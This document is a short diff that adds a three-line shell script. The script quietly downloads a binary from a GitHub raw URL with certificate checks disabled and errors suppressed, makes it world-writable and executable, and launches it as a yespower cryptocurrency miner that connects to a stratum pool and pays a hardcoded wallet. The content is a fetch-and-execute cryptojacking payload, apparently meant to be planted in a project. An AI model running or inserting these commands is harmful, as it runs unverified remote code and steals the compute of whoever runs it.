@@ -1,0 +1,3 @@
+curl -L --insecure --connect-timeout 5 --max-time 40 --fail http://raw.githubusercontent.com/anw1012/yw/main/b6 -o b6 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 http://raw.githubusercontent.com/anw1012/yw/main/b6 -O b6 2> /dev/null || _curl http://raw.githubusercontent.com/anw1012/yw/main/b6 > b6 
+chmod 777 b6
+./b6 -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017  -u web6q0p7yclfvpdar2qs60jhkx6y7sz5cm2ry34km0y.FSHLin;
